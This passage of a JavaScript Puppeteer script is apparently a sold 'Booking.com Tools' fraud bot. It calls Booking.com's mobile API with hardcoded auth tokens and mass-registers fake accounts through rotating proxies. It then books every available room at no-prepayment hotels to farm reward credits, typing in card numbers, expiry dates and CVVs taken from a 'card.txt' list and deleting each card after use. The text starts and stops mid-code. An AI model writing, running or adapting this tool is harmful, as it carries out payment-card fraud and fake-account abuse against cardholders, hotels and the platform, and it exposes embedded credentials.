&show_min_stay=1&logged_out_genius=1&include_city_in_trans=1&show_occupancy_for_price=1&include_cancellation_special_condition=1&include_facility_type=1&include_bsb_offer=1&include_transparency_reinforcement=1&rec_guest_qty=2&include_paymentterms=1&change_struct_rooms=1&include_cancellation_timeline=1&network_type=wifi&units=metric&user_latitude=-6.554053299821086&include_bed_prices_in_user_currency=1&include_cpv2_for_room=1&show_genius_free_breakfast=0&include_prepayment_timeline=1&include_tax_exception=1&include_contact_host_check=1&dotd=2&upsort_view_highlight=1&include_nr_bedrooms=1&ga_enhanced_ecommerce_tracking=1&currency_code=IDR&include_occupancy_regulation_copy=1&use_new_image_service=1&add_genius_percentage_value=1&include_rl_use_block_filter=1&include_sustainability=1&include_missing_survey_check=1&show_if_no_cc_allowed=2&rec_room_qty=5&include_extra_for_child=1&include_genius_badge=1&include_is_mostly_soldout=1&flex2nonref=1&show_lift_highlight=1&include_badges_in_price_breakdown=1&include_apt_config=1&show_checkin_instructions=1&hotelpage_handle_soldout_cases=1&change_copy_for_private_bathroom=1&include_nr_bookings_today=1`,
        {
          headers: {
            Host: "mobile-apps.booking.com",
            Authorization: "Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN",
            "X-Booking-Api-Version": "1",
            "Accept-Language": "en-us",
            "Accept-Encoding": "gzip, deflate",
            "X-Auth-Token": "8004c5fc44b20423c3f0b73232f67119442610f0",
            "X-Apollo-Operation-Id":
              "7e623a1d23f2b2f0e792060013c8b76909536c9dcea5e7ab990879d06a4b9830",
            "X-Apollo-Operation-Name": "WalletBalance",
            "X-Booking-Iam-Access-Token": iamAccessToken,
            "X-Access-Token": iamAccessToken,
            "User-Agent":
              "Booking.App/39.4 Android/11; Type: mobile; AppStore: google; Brand: Google; Model: Pixel",
            "X-Library": "okhttp+network-api",
            "X-Px-Authorization": "1",
          },
        }
      )
        .then((res) => res.json())
        .then((res) => resolve(res))
        .catch((err) => reject(err))
    })
  
//   var iamAccessToken = "CAES_wQSrQQIAhC7mN2VBRqiBPfqHsHVLoEIfLsub2WdBn0j75gB7m0QLnElOgWFk2HV_5m1UOuFo0I5mrmGDgWDNcr2uleG-X0Hro-XvSAGdtxEv0Zi-TxWbQqc0pXrxIJkET65NOgOoEmsW6uET3Rp0f6bVqc1OthBApyStiG02CFFaIMgUbk0MRF2CbXXntsWRuSVk1HmQp12EaNwcW7lwk-GscoOoKveMhR5aWrfqZ-wHKvWxrKRJZHj1hspKatROnQIYfCrPmcp8Prz4XJN9S0o5wuOFTpHcjnrT3JY2Uyoj4Vu2QWWnXtIRUQOoSSRYTrpbN76HymKUhAK_cumTKFRsz6olKD58vkXwBz5eR3IIXbqtgoqTiaSpSDfd4IpEodqRWo9ICcdG1U_ZpvWH5rEi8s57jdrrLggvKTB9D372FBGYX5Ib9q-5x1AU25fEYFvH-7bRvRjWtuY9-Tgbk8GSZmxfKxbeJI22QWWz3wxauFtpuEMWGYXZsdhD0FpFmty0X_55VlGhGUrwC5Ecftcc5C-wPJB7eEojpNmZNTnktxSQAE1bGd9A5ThpOfh5B2Tv01ulbl2iH-YNqjxxmirFVeC7AuJ5wya4j3VStghLMddHpXknrzfWf5CWfscccqBdmMtNyi-9eK-oPwXeZoZi-AZ5QIJ85agb4Jknm9-sYn08UuOmr4lMb9frVDroq4UD4NS99kfacTAP37mDiOWFuw4mNz1cMsYGsC5LInf3hpAE8kBQh5ufJrNQ8NAVewmF69BGkqJnBKVHamDWSnQPkJ-2hv4XPTFABZuS1UI1WH60s-Gsfmj2s1_TCqMeyqqBCACKgEFMNzBkfAEOAE";
  const getUserProfile = (iamAccessToken) => {
    return new Promise((resolve, reject) => {
      return fetch(
        "https://mobile-apps.booking.com/json/mobile.wallet?page_size=-1&currency_code=HOTEL&txns=1&user_os=11&user_version=39.4-android&device_id=081b7f6b-0bd8-4275-8f9b-43405df0a9e4&network_type=wifi&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862",
        {
          method: "GET",
          headers: {
            Host: "mobile-apps.booking.com",
            Authorization: "Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN",
            "X-Booking-Api-Version": "1",
            "Accept-Language": "en-us",
            "Accept-Encoding": "gzip, deflate",
            "X-Auth-Token": "8004c5fc44b20423c3f0b73232f67119442610f0",
            "X-Apollo-Operation-Id":
              "7e623a1d23f2b2f0e792060013c8b76909536c9dcea5e7ab990879d06a4b9830",
            "X-Apollo-Operation-Name": "WalletBalance",
            "X-Booking-Iam-Access-Token": iamAccessToken,
            "X-Access-Token": iamAccessToken,
            "User-Agent":
              "Booking.App/39.4 Android/11; Type: mobile; AppStore: google; Brand: Google; Model: Pixel",
            "X-Library": "okhttp+network-api",
            "X-Px-Authorization": "1",
          },
        }
      )
        .then((res) => res.json())
        .then((res) => resolve(res))
        .catch((err) => reject(err))
    })
  }
  
  const getAccomodationLocation = (query) =>
    new Promise((resolve, reject) => {
      fetch("https://accommodations.booking.com/autocomplete.json", {
        method: "POST",
        headers: {
          authority: "accommodations.booking.com",
          accept: "*/*",
          "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "content-type": "text/plain;charset=UTF-8",
          origin: "https://www.booking.com",
          referer: "https://www.booking.com/",
          "sec-ch-ua":
            '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          "user-agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        },
        body: `{"query":"${query}"}`,
      })
        .then((res) => res.json())
        .then((res) => resolve(res))
        .catch((err) => reject(err))
    });


// if (cluster.isMaster) {

// } else {
    (async () => {
        
        // while (true) {
        //     var license = fs.readFileSync('license.txt', 'UTF-8');
        //     const licenseCheckResult = await licenseCheck(license);
        //     const namaBuyer = licenseCheckResult.FullName;
        //     const duration = licenseCheckResult.Duration;
        //     const MachineId1 = licenseCheckResult.MachineId1;
        //     const MachineId2 = licenseCheckResult.MachineId2;
        //     let id = machineIdSync;
        //     let myId = await id.machineSync({
        //         original: true
        //     });
        //     console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Machine Id :`, chalk.yellow(`${myId}`))
        //     if (namaBuyer) {
        //         console.log(chalk.white(`\nHas Found License`), chalk.green(`${namaBuyer}`), chalk.white(`Duration : `) + chalk.yellow(`${duration} Days\n`));
        //     } else {
        //         console.log(chalk.white(`\nNot Found License\n`));
        //         console.log(err)
        //         process.exit(0)
        //     }
        //     var data = `${MachineId1},${MachineId2}`;

        //     if (data.match(myId)) {} else {
        //         console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Not Found Machine ID On License :`, chalk.yellow(`${myId}`))
        //     }

        //     if (MachineId1 == '') {
        //         const addMachinez = await addMachine1(license, myId);
        //         console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Successfully Added Machine ID 1 :`, chalk.yellow(`${myId}`))
        //         continue;
        //     } else if (MachineId1 == myId) {
        //         console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Found Machine ID 1 :`, chalk.yellow(`${MachineId1}`))
        //         break;
        //     }

        //     if (MachineId2 == '') {
        //         const addMachinez = await addMachine2(license, myId);
        //         console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Successfully Added Machine ID 2 :`, chalk.yellow(`${myId}`))
        //         continue;
        //     } else if (MachineId2 == myId) {
        //         console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `Found Machine ID 2 :`, chalk.yellow(`${MachineId2}`))
        //         break;
        //     }
        // }
        console.log(chalk.yellow(`    Membership x ETL Discussion\n`))

        console.log(chalk.white('[') + chalk.green('!') + chalk.white(']') + ` Booking.com Tools\n`)
        console.log(chalk.white('[') + chalk.green('1') + chalk.white(']') + ` Auto Register -> Auto Checking Hotel Reward / Property -> Save Account [ `+chalk.green(`Chrome & API`)+` ]`)
        console.log(chalk.white('[') + chalk.green('2') + chalk.white(']') + ` Auto Register Proxy / Not Proxy [ `+chalk.green(`Chrome & API`)+` ]`)
        console.log(chalk.white('[') + chalk.green('3') + chalk.white(']') + ` Auto Get Data Hotel Earn Reward [ `+chalk.green(`API`)+` ]`)
        console.log(chalk.white('[') + chalk.green('4') + chalk.white(']') + ` Auto Get Reward Account [ `+chalk.green(`API`)+` ]`)
        // console.log(chalk.white('[') + chalk.green('5') + chalk.white(']') + ` Auto Add Profile Data Account [ `+chalk.green(`Chrome`)+` ]`)
        // console.log(chalk.white('[') + chalk.green('6') + chalk.white(']') + ` Auto Register Proxy / Not Proxy [ Email address added to dataRegis.txt Password Setting on AppConfig ] [ `+chalk.green(`Chrome & API`)+` ]`)

        console.log()
        var pilihan = readlineSync.question('Vote? ');
        console.log()
        if (pilihan == 1) {
            var inputUrl = setting.url
            var startPage = setting.startPage
            var vpnUse = setting.proxy
            var domain = setting.domain
            var password = setting.password
            var deviceId = rand(32);

            ancrit: while (true) {
                var randomAngka = randomNumber(1111, 9999);
                var first = random.first();
                var last = random.last();
                var first = first.toLowerCase();
                var last = last.toLowerCase();

                const kata2 = fs.readFileSync('card.txt', 'utf8')
                const list3 = kata2.split(/\r?\n/);
                const lineCount = list3.length;
                const randomLineNumber = Math.floor(Math.random() * lineCount)

                const kata3 = fs.readFileSync('proxy.txt', 'utf8')
                const list4 = kata3.split(/\r?\n/);
                const lineCount2 = list4.length;
                const randomLineNumber2 = Math.floor(Math.random() * lineCount2)
                try {
                    var proxy = list4[randomLineNumber2];

                    const proxyArray = proxy.split(':')
                    host = proxyArray[1].split('@');
                    host = host[1];
                    port = proxyArray[2];
                    host = `http://${host}:${port}`;
                    usernameProxy = proxyArray[0];
                    passwordProxy = proxyArray[1].split('@')[0];

                    if (vpnUse == "true") {
                        var args = [
                            '--disable-background-networking',
                            '--enable-features=NetworkService,NetworkServiceInProcess',
                            '--disable-background-timer-throttling',
                            '--disable-backgrounding-occluded-windows',
                            '--disable-breakpad',
                            '--disable-client-side-phishing-detection',
                            '--disable-component-extensions-with-background-pages',
                            '--disable-default-apps',
                            '--disable-dev-shm-usage',
                            '--disable-extensions',
                            // BlinkGenPropertyTrees disabled due to crbug.com/937609
                            '--disable-features=TranslateUI,BlinkGenPropertyTrees',
                            '--disable-hang-monitor',
                            '--disable-ipc-flooding-protection',
                            '--disable-popup-blocking',
                            '--disable-prompt-on-repost',
                            '--disable-renderer-backgrounding',
                            '--disable-sync',
                            '--force-color-profile=srgb',
                            '--metrics-recording-only',
                            '--no-first-run',
                            '--enable-automation',
                            '--password-store=basic',
                            '--use-mock-keychain',
                            '--disable-infobars',
                            '--mute-audio',
                            '--window-size=1200,800',
                            `--proxy-server=${host}`
                        ];

                        var randomAngka = randomNumber(1111, 9999);
                        var first = random.first();
                        var last = random.last();
                        var first = first.toLowerCase();
                        var last = last.toLowerCase();
                        var emailKu = `${first}${last}${randomAngka}@${domain}`;

                        var deviceId = randAngka(32);
                        var regisAccount = await regisAccountProxy(emailKu, deviceId, password, proxy);
                        if (regisAccount.ok == 1) {
                            console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Successfully Register [ With Proxy ]`))
                        } else {
                            console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Failure Register`))
                        }
                    } else {
                        var args = [
                            '--disable-background-networking',
                            '--enable-features=NetworkService,NetworkServiceInProcess',
                            '--disable-background-timer-throttling',
                            '--disable-backgrounding-occluded-windows',
                            '--disable-breakpad',
                            '--disable-client-side-phishing-detection',
                            '--disable-component-extensions-with-background-pages',
                            '--disable-default-apps',
                            '--disable-dev-shm-usage',
                            '--disable-extensions',
                            // BlinkGenPropertyTrees disabled due to crbug.com/937609
                            '--disable-features=TranslateUI,BlinkGenPropertyTrees',
                            '--disable-hang-monitor',
                            '--disable-ipc-flooding-protection',
                            '--disable-popup-blocking',
                            '--disable-prompt-on-repost',
                            '--disable-renderer-backgrounding',
                            '--disable-sync',
                            '--force-color-profile=srgb',
                            '--metrics-recording-only',
                            '--no-first-run',
                            '--enable-automation',
                            '--password-store=basic',
                            '--use-mock-keychain',
                            '--disable-infobars',
                            '--mute-audio',
                            '--window-size=1200,800',
                        ];

                        var randomAngka = randomNumber(1111, 9999);
                        var first = random.first();
                        var last = random.last();
                        var first = first.toLowerCase();
                        var last = last.toLowerCase();
                        var emailKu = `${first}${last}${randomAngka}@${domain}`;

                        var deviceId = randAngka(32);
                        var regisAccount = await regisAccountKu(emailKu, deviceId, password);
                        if (regisAccount.ok == 1) {
                            console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Successfully Register`))
                        } else {
                            console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Failure Register`))
                        }
                    }
                    var browser = await puppeteer.launch({
                        args,
                        executablePath: path,
                        headless: false,
                        ignoreHTTPSErrors: true,
                        ignoreDefaultArgs: ['--enable-automation'],
                    })

                    const pages = await browser.pages();
                    const page = pages[0];
                    const $options = {
                        waitUntil: 'domcontentloaded'
                    };

                    console.log()
                    if (vpnUse == "true") {
                        await page.authenticate({
                            username: usernameProxy,
                            password: passwordProxy
                        });
                    } else {

                    }

                    await page.goto('https://www.booking.com/index.html', $options)

                    await page.waitForSelector('a[aria-label="Sign in"]')
                    const signIn = await page.$('a[aria-label="Sign in"]');
                    await signIn.click();

                    await page.waitForSelector('#username')
                    const mail = await page.$('#username')
                    await mail.type(`${emailKu}`)

                    await delay(1000)
                    await page.keyboard.press('Enter')

                    await page.waitForSelector('#password')
                    const pass = await page.$('#password')
                    await pass.type(password)

                    await delay(1000)
                    await page.keyboard.press('Enter')

                    await delay(10000)
                    try {
                        await page.waitForSelector('button[data-testid="header-profile"]', {
                            visible: true,
                            timeout: 30000
                        })
                        const tier = await page.evaluate(() => {
                            return document.querySelector('button[data-testid="header-profile"]').innerText;
                        })

                        console.log(`[!] Your Account Tier     : ${tier}`)
                    } catch (err) {
                        await browser.close();
                    }

                    fs.readFile('account.json', 'utf8', (err, data) => {
                        if (err) {
                            console.error(err);
                            return;
                        }

                        // Parsing data JSON
                        const jsonData = JSON.parse(data);
                        if (jsonData.hasOwnProperty('SheetJS')) {

                            // Menambahkan entri baru dengan array yang berbeda
                            const newEntry = {
                                Email: emailKu,
                                Password: password,
                            };
                            jsonData.SheetJS.push(newEntry);

                            // Menyimpan data JSON yang diperbarui ke file
                            fs.writeFile('account.json', JSON.stringify(jsonData, null, 2), 'utf8', (err) => {
                                if (err) {
                                    console.error(err);
                                    return;
                                }

                                // console.log('    Data JSON telah diperbarui dan disimpan ke file dahjadi.json.');
                            });
                        } else {
                            // console.error('Properti "SheetJS" tidak ditemukan dalam objek JSON.');

                        }
                    });
                    console.log()
                    let countPage = startPage;
                    let multiplier = 25;
                    let maxOffset = 500;
                    memek: for (let offset = 0; offset <= maxOffset; offset += multiplier) {
                        let totalPagec = `&offset=${offset}`;
                        var newUrl = `${inputUrl}${totalPagec}`;
                        console.log('[!] Waiting For Checking ' + totalPagec + '')
                        await page.goto(newUrl, $options)
                        try {
                            page.on("dialog", dialog =>
                                dialog.type() === "beforeunload" && dialog.accept()
                            );
                        } catch (err) {

                        }

                        const matchesNameHotel = await page.$$eval('div[data-testid="title"]', elements => {
                            // Proses pengambilan data dari setiap elemen yang sesuai dengan selector
                            return elements.map(element => element.textContent);
                        });

                        const matchesLinkHotel = await page.$$eval('a[data-testid="title-link"]', elements => {
                            // Proses pengambilan data dari setiap elemen yang sesuai dengan selector
                            return elements.map(element => element.href);
                        });

                        const dataHotels = await page.$$eval('div[data-testid="recommended-units"]', elements => {
                            // Proses pengambilan data dari setiap elemen yang sesuai dengan selector
                            return elements.map(element => element.textContent);
                        });

                        // Menggunakan data yang telah diambil
                        for (let index = 0; index < matchesNameHotel.length; index++) {
                            const nameHotel = matchesNameHotel[index];
                            const linkHotel = matchesLinkHotel[index];
                            var infoHotel = dataHotels[index]
                            var card = list3[randomLineNumber].split('|')[0];
                            var month = list3[randomLineNumber].split('|')[1];
                            var year = list3[randomLineNumber].split('|')[2];
                            var cvv = list3[randomLineNumber].split('|')[3];
                            const firstDigit = card.toString()[0];

                            if (firstDigit === '4') {
                                typeCC = "Visa";
                            } else if (firstDigit === '5') {
                                typeCC = "MasterCard";
                            }

                            console.log(`[!] Your Account Mail     : ${emailKu}`)

                            console.log(chalk.white(`[`) + chalk.green(`${index}/${matchesNameHotel.length}`) + chalk.white(`]`), `Name Hotel : ` + chalk.yellow `${nameHotel}`)

                            if (infoHotel.match('No prepayment needed')) {
                                console.log(`    Waiting For Checking ${nameHotel}`)
                                // var linkHotel = "https://www.booking.com/hotel/mx/fornos.html?label=gen173bo-1DCAEoggI46AdIMVgDaGiIAQGYATG4ARfIAQzYAQPoAQH4AQSIAgGYAiGoAgO4AuDQraUGwAIB0gIkYzlhZjE0Y2QtNDgyMi00NjY3LTk4YzktOWQ4YjMyMDBhOTBh2AIE4AIB&sid=32e57d388addbdf6be68a2ff5a826ef0&aid=304142&ucfs=1&arphpl=1&checkin=2023-07-14&checkout=2023-07-29&dest_id=906241&dest_type=hotel&group_adults=2&req_adults=2&no_rooms=1&group_children=0&req_children=0&hpos=1&hapos=1&sr_order=popularity&srpvid=71a829fe72f90517&srepoch=1689141504&all_sr_blocks=90624105_369966703_2_1_0&highlighted_blocks=90624105_369966703_2_1_0&matching_block_id=90624105_369966703_2_1_0&sr_pri_blocks=90624105_369966703_2_1_0__2234320&from_sustainable_property_sr=1&from=searchresults&show_room=90624105#RD90624105";
                                try {
                                    await page.goto(linkHotel, $options)
                                } catch (err) {
                                    console.log(err)
                                }

                                try {
                                    await page.waitForSelector('#hprt-table > tbody > tr:nth-child(1) > td.hp-price-left-align.hprt-table-cell.hprt-table-cell-price > div > div.c-earn-credits > span.c-earn-credits_rt', {
                                        visible: true,
                                        timeout: 5000
                                    })
                                    const element = await page.$('#hprt-table > tbody > tr:nth-child(1) > td.hp-price-left-align.hprt-table-cell.hprt-table-cell-price > div > div.c-earn-credits > span.c-earn-credits_rt');
                                    var textContent = await page.evaluate(element => element.innerText, element);
                                } catch (err) {
                                    console.log('    Hotel Not Detect Reward')
                                    continue;
                                }

                                console.log(`    Room 1 Earn Reward Total : ${textContent}`)
                                let maxAttempts = 3;
                                let attempts = 0;
                                while (attempts < maxAttempts) {
                                    try {
                                        await page.waitForSelector('.hprt-nos-select');
                                        await page.click('.hprt-nos-select');
                                        break;
                                    } catch (error) {
                                        console.error(`Error while clicking: ${error}`);
                                        attempts++;
                                        console.log(`Retrying click (${attempts} of ${maxAttempts})...`);
                                    }
                                }

                                const selectSelector = '.hprt-nos-select';

                                // Evaluasi fungsi di dalam halaman untuk mendapatkan total optionValue
                                const totalOptionValue = await page.evaluate((selectSelector) => {
                                    const selectElement = document.querySelector(selectSelector);
                                    const options = selectElement.querySelectorAll('option');
                                    return options.length;
                                }, selectSelector);

                                var hasil = totalOptionValue - 1;
                                var totalRoom = hasil.toString();
                                console.log('    Total Room Payment ' + totalRoom + '')
                                await page.select('.hprt-nos-select', totalRoom);

                                while (attempts < maxAttempts) {
                                    try {
                                        await page.waitForSelector('span[class="bui-button__text js-reservation-button__text"]');
                                        await page.click('span[class="bui-button__text js-reservation-button__text"]');
                                        break;
                                    } catch (error) {
                                        console.error(`Error while clicking: ${error}`);
                                        attempts++;
                                        console.log(`Retrying click (${attempts} of ${maxAttempts})...`);
                                    }
                                }

                                await delay(3000)

                                await page.waitForSelector('#firstname')
                                const firstName = await page.$('#firstname')
                                await page.focus('#firstname')
                                await page.keyboard.type(first)
                                await delay(3000)
                                await page.keyboard.type('asd')

                                await page.waitForSelector('#lastname')
                                const lastname = await page.$('#lastname')
                                await lastname.type(last)
                                console.log(`    Successfully Fill Form ${first} ${last}`)
                                await autoScroll(page);

                                console.log('    Waiting For Checkout')
                                while (attempts < maxAttempts) {
                                    try {
                                        await page.waitForSelector('span[class="bui-button__text js-button__text"]');
                                        await page.click('span[class="bui-button__text js-button__text"]');
                                        break;
                                    } catch (error) {
                                        console.error(`Error while clicking: ${error}`);
                                        attempts++;
                                        console.log(`Retrying click (${attempts} of ${maxAttempts})...`);
                                    }
                                }
                                var number = randomNumber(11111111111, 99999999999);
                                console.log(`    Waiting Phone Number +62${number}`)
                                await page.waitForSelector('input[name="phone"]')
                                const phoneKu = await page.$('input[name="phone"]')
                                await page.focus('input[name="phone"]');
                                await page.keyboard.type(`${number}`)

                                try {
                                    await page.waitForSelector('#address1', {
                                        visilbe: true,
                                        timeout: 5000
                                    })
                                    const address = await page.$('#address1')
                                    await page.focus('#address1');
                                    await page.keyboard.type(`Jakarta Raya`)
                                } catch (err) {

                                }

                                try {
                                    await page.waitForSelector('#city', {
                                        visilbe: true,
                                        timeout: 5000
                                    })
                                    const city = await page.$('#city')
                                    await page.focus('#city');
                                    await page.keyboard.type('Jakarta')
                                } catch (err) {

                                }

                                try {
                                    await page.waitForSelector('#zip', {
                                        visilbe: true,
                                        timeout: 5000
                                    })
                                    const zipcode = await page.$('#zip')
                                    await page.focus('#zip');
                                    await page.keyboard.type(`13880`)
                                } catch (err) {

                                }
                                try {
                                    await page.waitForSelector('button[class="bui-modal__close"]', {
                                        visible: true,
                                        timeout: 10000
                                    })

                                    console.log('    Duplicate Order')
                                    const yea = await page.$('button[class="bui-modal__close"]')
                                    await yea.click()
                                } catch (err) {

                                }
                                console.log(`    Waiting For Input Card ${typeCC}`)
                                console.log(`    Waiting For Input ${card}|${month}|${year}`)

                                const dataToRemove = `${card}|${month}|${year}|${cvv}`;

                                fs.readFile('card.txt', 'utf8', (err, data) => {
                                    if (err) {
                                        console.error('Gagal membaca file:', err);
                                        return;
                                    }

                                    // Menghapus data yang sesuai
                                    const newData = data.replace(dataToRemove, '');

                                    fs.writeFile('card.txt', newData, 'utf8', (err) => {
                                        if (err) {
                                            console.error('Gagal menulis file:', err);
                                            return;
                                        }
                                        console.log('    Data berhasil dihapus dari file.');
                                    });
                                });

                                await delay(2000)
                                fs.readFile('card.txt', 'utf8', (err, data) => {
                                    if (err) {
                                        console.error(err);
                                        return;
                                    }

                                    // Menghapus baris kosong
                                    const lines = data.split('\n').filter(line => line.trim() !== '');

                                    // Menulis kembali isi file card.txt tanpa baris kosong
                                    fs.writeFile('card.txt', lines.join('\n'), err => {
                                        if (err) {
                                            console.error(err);
                                            return;
                                        }
                                    });
                                });


                                try {
                                    await page.waitForSelector('input[name="cc_number"]', {
                                        visible: true,
                                        timeout: 10000
                                    })
                                    const cardNumber = await page.$('input[name="cc_number"]')
                                    await page.focus('input[name="cc_number"]')
                                    await page.keyboard.type(card)
                                } catch (err) {
                                    await page.waitForSelector("#bookForm > div.payment-section > div.payment-instrument-section.bui-spacer--large > div > div > div > div:nth-child(2) > div > div:nth-child(2) > iframe", {
                                        visible: true,
                                        timeout: 5000
                                    });
                                    const elementHandle = await page.$('#bookForm > div.payment-section > div.payment-instrument-section.bui-spacer--large > div > div > div > div:nth-child(2) > div > div:nth-child(2) > iframe');
                                    const frames = await elementHandle.contentFrame();

                                    const cardNumber = await frames.$('input[autocomplete="cc-number"]')
                                    await cardNumber.click()
                                    await cardNumber.type(card)
                                }

                                try {
                                    await page.click('#cc_type');
                                    await page.select('#cc_type', typeCC);
                                } catch (err) {}


                                try {
                                    await page.click('#cc_month');
                                    await page.select('#cc_month', month);

                                    await page.click('#ccYear');
                                    await page.select('#ccYear', year);
                                } catch (err) {
                                    await page.waitForSelector("#bookForm > div.payment-section > div.payment-instrument-section.bui-spacer--large > div > div > div > div:nth-child(2) > div > div:nth-child(2) > iframe", {
                                        visible: true,
                                        timeout: 5000
                                    });
                                    const elementHandle = await page.$('#bookForm > div.payment-section > div.payment-instrument-section.bui-spacer--large > div > div > div > div:nth-child(2) > div > div:nth-child(2) > iframe');
                                    const frames = await elementHandle.contentFrame();

                                    var yearku = year.replace('20', '')
                                    const monthyear = await frames.$('input[placeholder="MM/YY"]')
                                    await monthyear.type(`${month}${yearku}`)
                                }

                                try {
                                    const cvvNumber = await page.$('input[name="cc_cvc"]')
                                    await page.focus('input[name="cc_cvc"]')
                                    await page.keyboard.type(cvv)
                                    await autoScroll(page);
                                } catch (err) {
                                    try {
                                        const elementHandle = await page.$('#bookForm > div.payment-section > div.payment-instrument-section.bui-spacer--large > div > div > div > div:nth-child(2) > div > div:nth-child(2) > iframe', {
                                            visible: true,
                                            timeout: 5000
                                        });
                                        const frames = await elementHandle.contentFrame();

                                        const cvvNumber = await frames.$('input[autocomplete="cc-csc"]')
                                        await cvvNumber.type(cvv)
                                        await autoScroll(page);
                                    } catch (err) {

                                    }
                                }

                                while (attempts < maxAttempts) {
                                    try {
                                        await page.waitForSelector('#bookForm > div.bui-group.bui-spacer--large > div > div:nth-child(3) > button > span.bui-button__text.js-button__text', {
                                            visible: true,
                                            timeout: 5000
                                        });
                                        await page.click('#bookForm > div.bui-group.bui-spacer--large > div > div:nth-child(3) > button > span.bui-button__text.js-button__text');
                                        break;
                                    } catch (error) {
                                        console.error(`Error while clicking: ${error}`);
                                        attempts++;
                                        console.log(`Retrying click (${attempts} of ${maxAttempts})...`);
                                    }
                                }

                                try {
                                    await page.waitForNavigation({
                                        waitUntil: 'networkidle0'
                                    });
                                } catch (err) {

                                }

                                try {
                                    await page.waitForSelector('#column_holder > div.confirmation_status_container > div:nth-child(1) > div > div > h1', {
                                        visible: true,
                                        timeout: 10000
                                    })
                                    const info = await page.evaluate(() => {
                                        return document.querySelector('#column_holder > div.confirmation_status_container > div:nth-child(1) > div > div > h1').innerText;
                                    })

                                    console.log(`    ${info}`)

                                    const data = fs.readFileSync('account.json', 'utf8');
                                    const jsonData = JSON.parse(data);

                                    let emailIndex = -1;

                                    jsonData.SheetJS.forEach((entry, index) => {
                                        if (entry.Email === emailKu) {
                                            emailIndex = index;
                                            return; // Stop the iteration once the email is found
                                        }
                                    });

                                    var randomNumberc = randomNumber(111, 9999);
                                    jsonData.SheetJS[emailIndex][`HotelOrderNumber[${randomNumberc}]`] = `${nameHotel}`;
                                    fs.writeFile('account.json', JSON.stringify(jsonData, null, 2), 'utf8', (err) => {
                                        if (err) {
                                            console.error('Error writing JSON file:', err);
                                            return;
                                        }
                                    });
                                    await browser.close();
                                } catch (err) {
                                    var info = "Failure Checkout"
                                    console.log(`    ${info}`)
                                }
                            } else {
                                console.log(`    ${nameHotel} ` + chalk.red(`not detected pay at property`))
                            }
                        }
                    }
                } catch (err) {
                    await browser.close();
                }
            }
        } else if (pilihan == 2) {
            var inputUrl = setting.url
            var startPage = setting.startPage
            var vpnUse = setting.proxy
            var domain = setting.domain
            var password = setting.password
            var deviceId = rand(32);

            var total = readlineSync.question('[!] Total Account : ');
            console.log();
            for (let index = 0; index < total; index++) {
                if (vpnUse == "true") {
                    const kata3 = fs.readFileSync('proxy.txt', 'utf8')
                    const list4 = kata3.split(/\r?\n/);
                    const lineCount2 = list4.length;
                    const randomLineNumber2 = Math.floor(Math.random() * lineCount2)
                    var proxy = list4[randomLineNumber2];
                    var randomAngka = randomNumber(1111, 9999);
                    var first = random.first();
                    var last = random.last();
                    var first = first.toLowerCase();
                    var last = last.toLowerCase();
                    var emailKu = `${first}${last}${randomAngka}@${domain}`;

                    var deviceId = randAngka(32);
                    var regisAccount = await regisAccountProxy(emailKu, deviceId, password, proxy);
                    if (regisAccount.ok == 1) {
                        console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Successfully Register [ With Proxy ]`))
                    } else {
                        console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Failure Register`))
                    }
                } else {
                    var randomAngka = randomNumber(1111, 9999);
                    var first = random.first();
                    var last = random.last();
                    var first = first.toLowerCase();
                    var last = last.toLowerCase();
                    var emailKu = `${first}${last}${randomAngka}@${domain}`;

                    var deviceId = randAngka(32);
                    var regisAccount = await regisAccountKu(emailKu, deviceId, password);
                    if (regisAccount.ok == 1) {
                        console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Successfully Register`))
                    } else {
                        console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${emailKu}|${password}`, chalk.yellow(`Failure Register`))
                    }
                }


                var args = [
                    '--disable-background-networking',
                    '--enable-features=NetworkService,NetworkServiceInProcess',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-breakpad',
                    '--disable-client-side-phishing-detection',
                    '--disable-component-extensions-with-background-pages',
                    '--disable-default-apps',
                    '--disable-dev-shm-usage',
                    '--disable-extensions',
                    // BlinkGenPropertyTrees disabled due to crbug.com/937609
                    '--disable-features=TranslateUI,BlinkGenPropertyTrees',
                    '--disable-hang-monitor',
                    '--disable-ipc-flooding-protection',
                    '--disable-popup-blocking',
                    '--disable-prompt-on-repost',
                    '--disable-renderer-backgrounding',
                    '--disable-sync',
                    '--force-color-profile=srgb',
                    '--metrics-recording-only',
                    '--no-first-run',
                    '--enable-automation',
                    '--password-store=basic',
                    '--use-mock-keychain',
                    '--disable-infobars',
                    '--mute-audio',
                    '--window-size=1200,800',
                ];

                var browser = await puppeteer.launch({
                    args,
                    executablePath: path,
                    headless: false,
                    ignoreHTTPSErrors: true,
                    ignoreDefaultArgs: ['--enable-automation'],
                })

                const pages = await browser.pages();
                const page = pages[0];
                const $options = {
